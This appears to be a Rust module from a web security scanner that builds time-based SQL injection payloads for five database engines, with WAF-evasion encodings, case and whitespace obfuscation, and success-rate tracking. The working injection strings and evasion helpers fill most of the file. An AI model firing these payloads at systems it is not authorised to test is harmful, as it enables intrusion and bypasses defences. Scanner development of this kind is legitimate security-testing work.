//! Time-Based SQL Injection Payload Templates
//! Bounded payload templates for stacked queries, functions, and comment variants.

use crate::checks::sqli::time_based::DbmsType;
use std::collections::HashMap;

/// Maximum number of payloads to retain per category (bounded memory)
const MAX_PAYLOADS_PER_CATEGORY: usize = 50;

/// Encoded payload variant
#[derive(Debug, Clone)]
pub struct EncodedPayload {
    pub original: String,
    pub url_encoded: String,
    pub double_encoded: String,
    pub hex_encoded: String,
    pub unicode_encoded: String,
}

/// Comment style for SQL obfuscation
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum CommentStyle {
    DoubleDash,      // --
    Hash,            // #
    SlashStar,       // /* */
    OracleRem,       // REM
    MSSQLDoubleDash, // --+
}

impl CommentStyle {
    pub fn as_str(&self) -> &'static str {
        match self {
            CommentStyle::DoubleDash => "-- ",
            CommentStyle::Hash => "#",
            CommentStyle::SlashStar => "/* */",
            CommentStyle::OracleRem => "REM ",
            CommentStyle::MSSQLDoubleDash => "--+",
        }
    }
}

/// Payload template for time-based SQLi
#[derive(Debug, Clone)]
pub struct TimePayloadTemplate {
    pub dbms: DbmsType,
    pub category: PayloadCategory,
    pub template: String,
    pub delay_placeholder: String,
    pub comment_style: CommentStyle,
    pub encoding_hints: Vec<EncodingHint>,
}

/// Category of SQLi payload
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash)]
pub enum PayloadCategory {
    StackedQuery,
    InlineFunction,
    ConditionalDelay,
    PipeBased,
    RecursiveCTE,
    Benchmark,
}

/// Encoding hint for WAF evasion
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum EncodingHint {
    UrlEncode,
    DoubleUrlEncode,
    HexEncode,
    UnicodeEncode,
    CaseRandomize,
    AddWhitespace,
    NullByte,
}

/// Bounded payload generator for time-based SQLi
pub struct TimePayloadGenerator {
    templates: HashMap<PayloadCategory, Vec<TimePayloadTemplate>>,
    success_cache: HashMap<String, f64>, // payload -> success rate
}

impl TimePayloadGenerator {
    /// Create a new payload generator with pre-populated templates
    pub fn new() -> Self {
        let mut gen = Self {
            templates: HashMap::new(),
            success_cache: HashMap::new(),
        };
        gen.populate_templates();
        gen
    }

    /// Populate bounded template collection
    fn populate_templates(&mut self) {
        // MySQL stacked query payloads
        let mysql_payloads = vec![
            TimePayloadTemplate {
                dbms: DbmsType::MySQL,
                category: PayloadCategory::StackedQuery,
                template: "'; SELECT SLEEP({{DELAY}})-- ".to_string(),
                delay_placeholder: "{{DELAY}}".to_string(),
                comment_style: CommentStyle::DoubleDash,
                encoding_hints: vec![EncodingHint::UrlEncode, EncodingHint::CaseRandomize],
            },
            TimePayloadTemplate {
                dbms: DbmsType::MySQL,
                category: PayloadCategory::InlineFunction,
                template: "' OR SLEEP({{DELAY}})='1".to_string(),
                delay_placeholder: "{{DELAY}}".to_string(),
                comment_style: CommentStyle::DoubleDash,
                encoding_hints: vec![EncodingHint::UrlEncode],
            },
            TimePayloadTemplate {
                dbms: DbmsType::MySQL,
                category: PayloadCategory::ConditionalDelay,
                template: "' AND IF(1=1,SLEEP({{DELAY}}),1)-- ".to_string(),
                delay_placeholder: "{{DELAY}}".to_string(),
                comment_style: CommentStyle::DoubleDash,
                encoding_hints: vec![EncodingHint::UrlEncode, EncodingHint::HexEncode],
            },
        ];
        self.templates
            .insert(PayloadCategory::StackedQuery, mysql_payloads);

        // PostgreSQL payloads
        let pg_payloads = vec![
            TimePayloadTemplate {
                dbms: DbmsType::PostgreSQL,
                category: PayloadCategory::StackedQuery,
                template: "'; SELECT pg_sleep({{DELAY}});-- ".to_string(),
                delay_placeholder: "{{DELAY}}".to_string(),
                comment_style: CommentStyle::DoubleDash,
                encoding_hints: vec![EncodingHint::UrlEncode],
            },
            TimePayloadTemplate {
                dbms: DbmsType::PostgreSQL,
                category: PayloadCategory::InlineFunction,
                template: "'; SELECT CASE WHEN 1=1 THEN pg_sleep({{DELAY}}) ELSE 0 END;-- ".to_string(),
                delay_placeholder: "{{DELAY}}".to_string(),
                comment_style: CommentStyle::DoubleDash,
                encoding_hints: vec![EncodingHint::UrlEncode, EncodingHint::CaseRandomize],
            },
        ];
        self.templates
            .insert(PayloadCategory::InlineFunction, pg_payloads);

        // MSSQL payloads
        let mssql_payloads = vec![
            TimePayloadTemplate {
                dbms: DbmsType::MSSQL,
                category: PayloadCategory::StackedQuery,
                template: "'; WAITFOR DELAY '0:0:{{DELAY}}';-- ".to_string(),
                delay_placeholder: "{{DELAY}}".to_string(),
                comment_style: CommentStyle::DoubleDash,
                encoding_hints: vec![EncodingHint::UrlEncode],
            },
            TimePayloadTemplate {
                dbms: DbmsType::MSSQL,
                category: PayloadCategory::ConditionalDelay,
                template: "' IF 1=1 WAITFOR DELAY '0:0:{{DELAY}}'-- ".to_string(),
                delay_placeholder: "{{DELAY}}".to_string(),
                comment_style: CommentStyle::DoubleDash,
                encoding_hints: vec![EncodingHint::UrlEncode, EncodingHint::HexEncode],
            },
        ];
        self.templates
            .insert(PayloadCategory::ConditionalDelay, mssql_payloads);

        // Oracle payloads
        let oracle_payloads = vec![
            TimePayloadTemplate {
                dbms: DbmsType::Oracle,
                category: PayloadCategory::PipeBased,
                template: "' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('SQLI',{{DELAY}})-- ".to_string(),
                delay_placeholder: "{{DELAY}}".to_string(),
                comment_style: CommentStyle::DoubleDash,
                encoding_hints: vec![EncodingHint::UrlEncode],
            },
            TimePayloadTemplate {
                dbms: DbmsType::Oracle,
                category: PayloadCategory::InlineFunction,
                template: "' AND DBMS_LOCK.SLEEP({{DELAY}})=0-- ".to_string(),
                delay_placeholder: "{{DELAY}}".to_string(),
                comment_style: CommentStyle::DoubleDash,
                encoding_hints: vec![EncodingHint::UrlEncode, EncodingHint::CaseRandomize],
            },
        ];
        self.templates
            .insert(PayloadCategory::PipeBased, oracle_payloads);

        // SQLite payloads
        let sqlite_payloads = vec![
            TimePayloadTemplate {
                dbms: DbmsType::SQLite,
                category: PayloadCategory::RecursiveCTE,
                template: "'; WITH RECURSIVE s(i) AS (VALUES(1) UNION ALL SELECT i+1 FROM s WHERE i<{{DELAY}}000000) SELECT * FROM s;-- ".to_string(),
                delay_placeholder: "{{DELAY}}".to_string(),
                comment_style: CommentStyle::DoubleDash,
                encoding_hints: vec![EncodingHint::UrlEncode],
            },
        ];
        self.templates
            .insert(PayloadCategory::RecursiveCTE, sqlite_payloads);
    }

    /// Generate encoded variants of a payload
    pub fn encode_payload(&self, payload: &str) -> EncodedPayload {
        EncodedPayload {
            original: payload.to_string(),
            url_encoded: urlencoding::encode(payload).to_string(),
            double_encoded: urlencoding::encode(&urlencoding::encode(payload).to_string())
                .to_string(),
            hex_encoded: payload
                .chars()
                .map(|c| format!("%{:02X}", c as u8))
                .collect(),
            unicode_encoded: payload
                .chars()
                .map(|c| format!("\\u{:04X}", c as u32))
                .collect(),
        }
    }

    /// Get payloads for a specific DBMS and category
    pub fn get_payloads(&self, dbms: DbmsType, category: PayloadCategory, delay: u32) -> Vec<String> {
        let mut result = Vec::new();

        if let Some(templates) = self.templates.get(&category) {
            for template in templates {
                if template.dbms == dbms || dbms == DbmsType::Unknown {
                    let payload = template
                        .template
                        .replace(&template.delay_placeholder, &delay.to_string());
                    result.push(payload);
                }
            }
        }

        result
    }

    /// Get all payloads with WAF evasion encodings
    pub fn get_evasion_payloads(&self, dbms: DbmsType, delay: u32) -> Vec<EncodedPayload> {
        let mut result = Vec::new();
        let categories = [
            PayloadCategory::StackedQuery,
            PayloadCategory::InlineFunction,
            PayloadCategory::ConditionalDelay,
            PayloadCategory::PipeBased,
            PayloadCategory::RecursiveCTE,
        ];

        for category in &categories {
            let payloads = self.get_payloads(dbms, *category, delay);
            for payload in payloads {
                let encoded = self.encode_payload(&payload);
                
                // Bounded: only keep first MAX_PAYLOADS_PER_CATEGORY
                if result.len() < MAX_PAYLOADS_PER_CATEGORY {
                    result.push(encoded);
                }
            }
        }

        result
    }

    /// Record payload success for learning
    pub fn record_success(&mut self, payload: &str, success: bool) {
        let rate = self.success_cache.entry(payload.to_string()).or_insert(0.0);
        let adjustment = if success { 0.1 } else { -0.05 };
        *rate = (*rate + adjustment).clamp(0.0, 1.0);
    }

    /// Get top successful payloads sorted by success rate
    pub fn get_top_payloads(&self, limit: usize) -> Vec<(String, f64)> {
        let mut sorted: Vec<_> = self.success_cache.iter().collect();
        sorted.sort_by(|a, b| b.1.partial_cmp(a.1).unwrap_or(std::cmp::Ordering::Equal));
        sorted.into_iter().take(limit).map(|(k, v)| (k.clone(), *v)).collect()
    }

    /// Apply randomization for WAF evasion
    pub fn randomize_case(&self, payload: &str) -> String {
        use rand::Rng;
        let mut rng = rand::thread_rng();
        payload
            .chars()
            .map(|c| {
                if c.is_alphabetic() && rng.gen_bool(0.5) {
                    if rng.gen_bool(0.5) {
                        c.to_uppercase().next().unwrap_or(c)
                    } else {
                        c.to_lowercase().next().unwrap_or(c)
                    }
                } else {
                    c
                }
            })
            .collect()
    }

    /// Add whitespace obfuscation
    pub fn add_whitespace_obfuscation(&self, payload: &str) -> String {
        let whitespace = [" ", "\t", "\n", "\r", "%09", "%0A", "%0D"];
        let mut result = String::new();

        for c in payload.chars() {
            result.push(c);
            if c == ' ' || c == '(' || c == ',' {
                // Add random whitespace after delimiters
                if rand::random::<f32>() < 0.3 {
                    result.push_str(whitespace[rand::random::<usize>() % whitespace.len()]);
                }
            }
        }

        result
    }
}

impl Default for TimePayloadGenerator {
    fn default() -> Self {
        Self::new()
    }
}

// Note: Requires rand and urlencoding crates in Cargo.toml
// [dependencies]
// rand = "0.8"
// urlencoding = "2.1"

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_payload_generation() {
        let gen = TimePayloadGenerator::new();
        let payloads = gen.get_payloads(DbmsType::MySQL, PayloadCategory::StackedQuery, 2);
        assert!(!payloads.is_empty());
        assert!(payloads[0].contains("SLEEP(2)"));
    }

    #[test]
    fn test_encoding() {
        let gen = TimePayloadGenerator::new();
        let encoded = gen.encode_payload("' OR 1=1-- ");
        assert!(encoded.url_encoded.contains("%27"));
    }

    #[test]
    fn test_success_tracking() {
        let mut gen = TimePayloadGenerator::new();
        gen.record_success("test_payload", true);
        gen.record_success("test_payload", true);
        
        let top = gen.get_top_payloads(1);
        assert_eq!(top.len(), 1);
        assert!(top[0].1 > 0.1);
    }
}
